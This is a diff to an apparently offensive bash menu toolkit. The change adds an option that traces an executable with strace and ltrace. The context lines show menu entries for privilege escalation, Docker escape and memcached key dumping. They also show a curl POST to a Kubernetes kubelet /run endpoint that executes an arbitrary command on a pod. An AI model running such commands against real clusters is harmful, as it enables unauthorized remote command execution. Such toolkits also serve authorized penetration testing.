@@ -112,7 +112,7 @@ while true; do
 	echo -ne " 148. view history\t\t\t\t\t\t161. Privesc with chroot\t\t\t\t\n"
 	echo -ne " 168. search keywords inside files in specific folder\t\t\t\t\t169. dump keys from memcached\n"
 	echo -ne " 171. escape from Docker method 1\t\t\t174. extract a tar.gz file\n"
-	echo -ne " 177. use Kubernetes exploit for Local Command Execution\n"
+	echo -ne " 177. use Kubernetes exploit for Local Command Execution\t\t\t\t178. analyze an executable file with strace and ltrace\n"
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
@@ -720,6 +720,30 @@ while true; do
 		if [[ "$CMD" != "" ]];
 		then
 			curl -k -XPOST "https://k8s-node-1:10250/run/kube-system/node-exporter-iuwg7/node-exporter" -d "cmd=""$CMD"
+		fi
+	;;
+	"178")
+		if [[ -f $(which strace) ]];
+		then
+			if [[ -f $(which ltrace) ]];
+			then
+				echo "Digit an executable file name to analyze"
+				read -p "(example, ./sysinfo): " EXF
+				if [[ -f "$EXF" ]];
+				then
+					echo "Digit a report file name"
+					read -p "(example, sysinfo): " RPF
+					if [[ "$RPF" != "" ]];
+					then
+						strace -f -i -o "$RPF"".strace" "$EXF"
+						ltrace -f -i -o "$RPF"".ltrace" "$EXF"
+					fi
+				fi
+			else
+				echo "ltrace not found!"
+			fi
+		else
+			echo "strace not found!"
 		fi
 	;;
 	*)
